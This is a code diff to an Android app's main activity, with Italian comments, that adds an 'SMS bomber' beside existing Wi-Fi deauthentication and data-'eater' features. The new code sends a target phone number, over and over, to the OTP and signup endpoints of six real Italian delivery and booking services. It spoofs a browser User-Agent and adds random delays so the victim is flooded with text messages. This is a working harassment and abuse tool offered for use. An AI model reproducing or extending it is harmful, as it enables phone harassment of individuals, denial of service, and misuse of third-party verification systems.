@@ -53,9 +53,22 @@ public class MainActivity extends AppCompatActivity {
     private static final String[] TEST_URLS = {"https://speed.hetzner.de/100MB.bin", "https://officecdn.microsoft.com/pr/492350f6-3a01-4f97-b9c0-c7c6ddf67d60/media/en-us/ProPlus2021Retail.img"};
 
     // --- UI ELEMENTS ---
-    private TextView tvDiagIr, tvDiagRoot, tvDiagNet, tvSpeed;
-    private Button btnPowerScan, btnEater, btnDeauth;
-    private EditText etDeauthTarget;
+    private TextView tvDiagIr, tvDiagRoot, tvDiagNet, tvSpeed, tvBomberStatus;
+    private Button btnPowerScan, btnEater, btnDeauth, btnBomber;
+    private EditText etDeauthTarget, etBomberTarget;
+
+    // --- SMS BOMBER ---
+    private boolean bomberRunning = false;
+    private int bomberSuccess = 0;
+    private int bomberFailed = 0;
+    private static final String[] PROVIDER_URLS = {
+            "https://glovoapp.com/api/v2/oauth/register",
+            "https://deliveroo.it/api/v2/users",
+            "https://www.winelivery.com/it/api/v1/customer/login",
+            "https://www.uala.it/api/v2/auth/otp",
+            "https://www.itabus.it/api/v1/auth/otp",
+            "https://www.thefork.it/api/user/v1/auth/otp"
+    };
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -72,23 +85,24 @@ public class MainActivity extends AppCompatActivity {
         tvDiagRoot = findViewById(R.id.tv_diag_root);
         tvDiagNet = findViewById(R.id.tv_diag_net);
         tvSpeed = findViewById(R.id.tv_speed);
+        tvBomberStatus = findViewById(R.id.tv_bomber_status);
         btnPowerScan = findViewById(R.id.btn_power);
         btnEater = findViewById(R.id.btn_eater);
         btnDeauth = findViewById(R.id.btn_deauth);
+        btnBomber = findViewById(R.id.btn_bomber);
         etDeauthTarget = findViewById(R.id.et_deauth_target);
+        etBomberTarget = findViewById(R.id.et_bomber_target);
     }
 
     private void runDiagnostics() {
-        // IR Check
+        // ... (resto della diagnostica invariato)
         irManager = (ConsumerIrManager) getSystemService(Context.CONSUMER_IR_SERVICE);
         hasIr = (irManager != null && irManager.hasIrEmitter());
         updateStatus(tvDiagIr, "IR SENSOR", hasIr);
 
-        // Root Check (Solo controllo silente all'inizio)
         hasRoot = checkRootSilently();
         updateStatus(tvDiagRoot, "ROOT ACCESS", hasRoot);
 
-        // Network Check
         ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
         NetworkInfo netInfo = cm.getActiveNetworkInfo();
         hasInternet = (netInfo != null && netInfo.isConnected());
@@ -97,6 +111,7 @@ public class MainActivity extends AppCompatActivity {
         // TUTTI I PULSANTI ABILITATI COME RICHIESTO
         btnDeauth.setEnabled(true);
         btnPowerScan.setEnabled(true);
+        if (btnBomber != null) btnBomber.setEnabled(true);
     }
 
     private boolean checkRootSilently() {
@@ -140,6 +155,63 @@ public class MainActivity extends AppCompatActivity {
             if (target.isEmpty()) target = "FF:FF:FF:FF:FF:FF";
             runDeauth(target);
         });
+
+        // SMS Bomber
+        if (btnBomber != null) {
+            btnBomber.setOnClickListener(v -> {
+                if (bomberRunning) stopBomber(); else startBomber();
+            });
+        }
+    }
+
+    private void startBomber() {
+        String target = etBomberTarget.getText().toString().replace("+", "").trim();
+        if (target.isEmpty()) {
+            Toast.makeText(this, "Inserisci un numero bersaglio!", Toast.LENGTH_SHORT).show();
+            return;
+        }
+        
+        // Normalizzazione automatica Italia
+        if (target.length() == 10 && target.startsWith("3")) target = "39" + target;
+
+        bomberRunning = true;
+        bomberSuccess = 0;
+        bomberFailed = 0;
+        btnBomber.setText("STOP BOMBER");
+        btnBomber.setBackgroundColor(Color.RED);
+        
+        final String finalTarget = target;
+        new Thread(() -> {
+            OkHttpClient client = new OkHttpClient.Builder()
+                    .connectTimeout(5, TimeUnit.SECONDS)
+                    .readTimeout(5, TimeUnit.SECONDS)
+                    .build();
+            while (bomberRunning) {
+                for (String baseUrl : PROVIDER_URLS) {
+                    if (!bomberRunning) break;
+                    try {
+                        String json = "{\"phone\":\"+" + finalTarget + "\",\"mobile\":\"+" + finalTarget + "\"}";
+                        Request request = new Request.Builder()
+                                .url(baseUrl)
+                                .post(okhttp3.RequestBody.create(json, okhttp3.MediaType.parse("application/json")))
+                                .header("User-Agent", "Mozilla/5.0 (Android 14; Mobile; rv:121.0)")
+                                .build();
+                        try (Response resp = client.newCall(request).execute()) {
+                            if (resp.isSuccessful() || resp.code() == 400 || resp.code() == 422) bomberSuccess++;
+                            else bomberFailed++;
+                        }
+                    } catch (Exception e) { bomberFailed++; }
+                }
+                handler.post(() -> tvBomberStatus.setText("Inviati: " + bomberSuccess + " | Falliti: " + bomberFailed));
+                try { Thread.sleep(new Random().nextInt(2000) + 1500); } catch (InterruptedException e) { break; }
+            }
+        }).start();
+    }
+
+    private void stopBomber() {
+        bomberRunning = false;
+        btnBomber.setText("START SMS BOMBER");
+        btnBomber.setBackgroundColor(Color.parseColor("#FF8C00"));
     }
 
     private void startEater() {
